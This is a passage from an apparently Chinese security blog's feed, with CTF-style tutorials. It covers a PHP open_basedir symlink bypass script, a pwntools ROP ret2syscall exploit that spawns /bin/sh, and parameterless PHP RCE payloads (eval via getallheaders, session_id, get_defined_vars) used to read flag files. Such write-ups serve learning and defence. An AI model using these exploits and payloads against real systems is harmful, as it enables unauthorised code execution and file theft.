explode(&#39;&#x2F;&#39;, $relat_file);</span><br><span class="line">$j &#x3D; 0;</span><br><span class="line">for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line">for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$tmp &#x3D; array_fill(0, $j + 1, $name);</span><br><span class="line">symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);</span><br><span class="line">$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);</span><br><span class="line">symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);</span><br><span class="line">unlink(&#39;tmplink&#39;);</span><br><span class="line">mkdir(&#39;tmplink&#39;);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;</span><br><span class="line">$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;</span><br><span class="line">echo &quot;\n-----------------content---------------\n\n&quot;;</span><br><span class="line">echo file_get_contents($exp);</span><br><span class="line">delfile(&#39;tmplink&#39;);</span><br><span class="line"></span><br><span class="line">function getRelativePath($from, $to) &#123;</span><br><span class="line">  &#x2F;&#x2F; some compatibility fixes for Windows paths</span><br><span class="line">  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;</span><br><span class="line">  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);</span><br><span class="line"></span><br><span class="line">  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);</span><br><span class="line">  $relPath  &#x3D; $to;</span><br><span class="line"></span><br><span class="line">  foreach($from as $depth &#x3D;&gt; $dir) &#123;</span><br><span class="line">    &#x2F;&#x2F; find first non-matching dir</span><br><span class="line">    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;</span><br><span class="line">      &#x2F;&#x2F; ignore this directory</span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      &#x2F;&#x2F; get number of remaining dirs to $from</span><br><span class="line">      $remaining &#x3D; count($from) - $depth;</span><br><span class="line">      if($remaining &gt; 1) &#123;</span><br><span class="line">        &#x2F;&#x2F; add traversals up to first matching dir</span><br><span class="line">        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;</span><br><span class="line">        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return implode(&#39;&#x2F;&#39;, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function delfile($deldir)&#123;</span><br><span class="line">    if (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @unlink($deldir);</span><br><span class="line">    &#125;else if(@is_dir($deldir))&#123;</span><br><span class="line">        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;</span><br><span class="line">        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);</span><br><span class="line">            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @rmdir($deldir) ? true : false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function File_Str($string)</span><br><span class="line">&#123;</span><br><span class="line">    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getRandStr($length &#x3D; 6) &#123;</span><br><span class="line">    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $randStr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/11.png" alt></p><p>更多bypass方法参考：<a href="https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/#网上的一个脚本" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#%E7%BD%91%E4%B8%8A%E7%9A%84%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC</a></p><p>参考资料：</p><blockquote><p><a href="https://xz.aliyun.com/t/4688#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4688#toc-8</a></p><p><a href="https://www.anquanke.com/post/id/197745#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-8</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/#一-dl-拓展库绕过" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p><p><a href="https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Bypass disabled_functions </tag>
            
            <tag> Bypass open_basedir </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-2nd解题记录</title>
      <link href="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0266bcff8a613581ff2050b3e89160d4b47ce30939679aa8c849820ef485c03a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP-Ret2Syscall原理及应用</title>
      <link href="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-ROP-Ret2Syscall原理"><a href="#0x-01-ROP-Ret2Syscall原理" class="headerlink" title="0x 01 ROP-Ret2Syscall原理"></a>0x 01 ROP-Ret2Syscall原理</h3><p>ROP-Ret2Syscall意思是调用系统函数来获取shell.</p><p>这里在讲两个概念：第一：ROP(Return-oriented programming),是一种基于代码复用技术的新型<strong><em>，</em></strong>者供已有的库或可执行文件中提取指令片段、构建恶意代码。</p><p>第二：Gadgets是指在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个Gadget来完成我们的功能。Gadget最后一般都有ret,因为要讲程序控制权(ip)给下一个Gadget。</p><h3 id="0x-02-实例分析"><a href="#0x-02-实例分析" class="headerlink" title="0x 02 实例分析"></a>0x 02 实例分析</h3><ol><li>伪代码</li></ol><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121225903103.png" alt></p><p>第八行里又一个gets函数是有溢出漏洞的,使用gdb里的pattern offset来获取溢出偏移量为112</p><ol start="2"><li><p>我们知道溢出偏移量了，现在我们想执行命令，例如execve(“/bin/sh”,null,null)。此时要设计到Linux在调用系统函数时的用法。</p><p>系统函数调用的指令是int 0x80,这是固定指令，他有四个参数：</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>如果你学过任意一门编程语言，可以理解为int  0x80(eax,ebx,ecx,edx)。可能会有这样的疑问：为什么是eax,ebx,ecx,edx要设置为这些值，答案是系统在运行的时候就是固定的要读这四个寄存器，如果不这么写，就不会调用到execve函数。</p><p>接下来我们就要一点点的去拼凑这些内容，我们没法直接在栈里写指令，只能够利用程序中自带的指令去拼凑。</p><p>首先我们将eax设置为0xb，我们是没法直接往栈里写mov eax,0xb的，那么还有另一种方式是pop eax，但是要保证栈顶必须是0xb。</p><p>然后设置ebx,ecx,edx，同样是这样的道理，所以我们可以想象栈中的数据是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop eax；ret</span><br><span class="line">0xb</span><br><span class="line">pop ebx;pop ecx;pop edx;ret</span><br><span class="line">&quot;&#x2F;bin&#x2F;sh&quot;的地址</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">int 0x80的地址</span><br></pre></td></tr></table></figure><p>这样我们就可以保值eax，ebx，ecx，edx的值了。</p><p>所以接下来我们要在程序中找一下有没有pop eax;和pop ebx;pop ecx;pop edx;的指令。</p><p>需要用到一个工具：ROPgadget</p><p>ROPgadget –binary ./ret2syscall –only “pop|ret” | grep “eax”</p><p>–only是指只有pop和ret指令</p></li></ol><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230259021.png" alt></p><p>我们使用0x080bb196，符合我们的预期。</p><p>接下来找类似pop ebx;pop ecx;pop edx;的指令</p><p>ROPgadget –binary ./ret2syscall –only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230412710.png" alt></p><p>恰好也有我们所需要的，只不过顺序和我们的不同，在组织payload时候需要调换下顺序。</p><p>我们在找一下字符串“/bin/sh”的地址</p><p>ROPgadget –binary ./ret2syscall –string “/bin/sh”</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230506453.png" alt></p><p>地址为0x080be408</p><p>我们在查找下“int 0x80”的地址</p><p>ROPgadget –binary ./ret2syscall –only “int”</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230556764.png" alt></p><p>地址为0x08049421</p><p>所以我们现在有了所有我们需要的内容了，接下来写payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2syscall&#39;)</span><br><span class="line">pop_eax_ret &#x3D; 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90</span><br><span class="line">int_0x80 &#x3D; 0x08049421</span><br><span class="line">binsh &#x3D; 0x80be408</span><br><span class="line">payload &#x3D; &#39;A&#39; * 112 + p32(pop_eax_ret) +p32(0xb)+p32(pop_edx_ecx_ebx_ret)+ p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>调试程序参考：<a href="https://blog.51cto.com/11797152/2379740?source=dra" target="_blank" rel="noopener">https://blog.51cto.com/11797152/2379740?source=dra</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP-Ret2Syscall原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php无参数RCE</title>
      <link href="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
      <url>/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-源代码分析"><a href="#0x-01-源代码分析" class="headerlink" title="0x 01 源代码分析"></a>0x 01 源代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须时纯小写字母的函数，而且不能携带参数，例如print_r(&quot;123&quot;);这种的，是不允许进行传入的</span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></figure><h3 id="0x-02-解题方法"><a href="#0x-02-解题方法" class="headerlink" title="0x 02 解题方法"></a>0x 02 解题方法</h3><ul><li>http-header传参</li></ul><p>在session_id中设置我们想要输入的RCE，达到传参的目的，但是第一点需要session_start()开启session会话。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：code&#x3D;eval(hex2bin(session_id(session_start())));</span><br><span class="line">Cookie: PHPSESSID&#x3D;706870696e666f28293b</span><br><span class="line"></span><br><span class="line">### hex(&quot;phpinfo();&quot;)&#x3D;706870696e666f28293b</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195207981.png" alt></p><ul><li><p>post/get传入参数</p><p>get_defined_vars()函数</p></li></ul><p>get_defined_vars ( void ) : array 返回由所有已定义变量所组成的数组<br> 此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?code&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195944964.png" alt></p><p>​    getallheaders()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paylaod:?code&#x3D;eval(end(getallheaders()));</span><br><span class="line">lxj: phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206200741938.png" alt></p><p>任意文件读取：dirname() &amp; chdir()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前目录的目录遍历:?code&#x3D;var_dump(scandir(getcwd()));</span><br><span class="line">目录上跳遍历：?code&#x3D;var_dump(scandir(dirname(getcwd())));、</span><br><span class="line">修改目录：chdir(dirname(getcwd()))</span><br><span class="line">具体参考：https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;03&#x2F;29&#x2F;PHP-Parametric-Function-RCE&#x2F;#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir</span><br></pre></td></tr></table></figure><h3 id="0x-03-例题分析"><a href="#0x-03-例题分析" class="headerlink" title="0x 03 例题分析"></a>0x 03 例题分析</h3><h4 id="3-1-ByteCTF-Boringcode"><a href="#3-1-ByteCTF-Boringcode" class="headerlink" title="3.1 ByteCTF Boringcode"></a>3.1 ByteCTF Boringcode</h4><p>原题部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; file_get_contents($url);</span><br><span class="line">            if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">                    echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题加大了很多难度，过滤了这么些东西 <code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/</code></p><p>首先利用readfile(end(scandir(“.”))) # </p><p>可以成功读取当前目录下的最后一个文件的，下一步就是绕过”.”</p><p>这里利用了localeconv()函数，函数返回的数组第一位正是我们需要的“.”函数，尝试构造一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure><p>可以成功读取当前目录下的最后一个文件,其他构造点的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) #46</span><br></pre></td></tr></table></figure><p>参考payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br><span class="line"># next(scandir(pos(localeconv()))) 返回字符串&#39;..&#39;即当前目录的上一级目录</span><br><span class="line"># 使用chdir()函数，更改目录，返回1的同时，读取目录下的文件</span><br><span class="line"></span><br><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line"># 通过chdir修改当前目录，通过localtime()等函数构造chr（46）即“.”达到读取上层目录文件的目的</span><br></pre></td></tr></table></figure><p>官方WP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure><h4 id="3-2-2019上海市大学生网络安全大赛-decade"><a href="#3-2-2019上海市大学生网络安全大赛-decade" class="headerlink" title="3.2 2019上海市大学生网络安全大赛_decade"></a>3.2 2019上海市大学生网络安全大赛_decade</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">if (!empty($code)) &#123;</span><br><span class="line">        if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">            echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;invalid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">        echo &quot;invalid&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>相比Byte发现与Byte的题目很相似，不同的就是正则过滤的更多了，我们就不能使用readfile等方式去读文件了，也不能用time的方式去获取“.”了。首先还是fuzz一下，php中类似readfile的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line">&#x2F;&#x2F; var_dump(preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, &#39;111&#39;));</span><br><span class="line"> </span><br><span class="line">$i_need_func&#x3D;array();</span><br><span class="line">$j&#x3D;0;</span><br><span class="line">for ($i&#x3D;0; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_|-&#x2F;i&#39;, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]&#x3D;get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($i_need_func);</span><br></pre></td></tr></table></figure><p>发现readgzfile这个函数，看一下函数的定义，主要是读取一个压缩文件，不过在本地测试时发现，该函数也可以实现readfile的功能去读取文件。</p><p>字节跳动原payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))));</span><br></pre></td></tr></table></figure><p>将readfile修改为readgzfile,这里不再使用time()函数，使用ord()、hebrevc()等函数构造,在7.0的php环境下：</p><p>首先尝试读取当前目录下的文件，仍然是构造“.”，原来构造的paylod：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure><p>因为题目中正则将“local”给过滤了，所以要换种方法去构造，本地尝试构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));</span><br></pre></td></tr></table></figure><p>但因为sqrt函数被过滤，继续构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(hebrevc(crypt(phpversion()))));</span><br></pre></td></tr></table></figure><p>crypt每次加密都是随机的，修改payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))));</span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure><p>极客大挑战 2019</p><p><img src="http://static.zybuluo.com/Pdsdt/el86boz75xe4eu21dt8p9ois/image.png" alt="image.png-130.7kB"></p><p>该函数会获取我们传输中headers的所有信息并以数组形式输出，我们可以将恶意代码写在传输的headers头中，再使用该函数进行包含执行，这样就可以达到我们绕过检测命令执行的目的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#headers : readfile(&quot;theflag.php&quot;);</span><br><span class="line"></span><br><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/sylover/p/11863778.html" target="_blank" rel="noopener">https://www.cnblogs.com/sylover/p/11863778.html</a></p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php无参数RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2Shellcode原理及应用</title>
      <link href="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
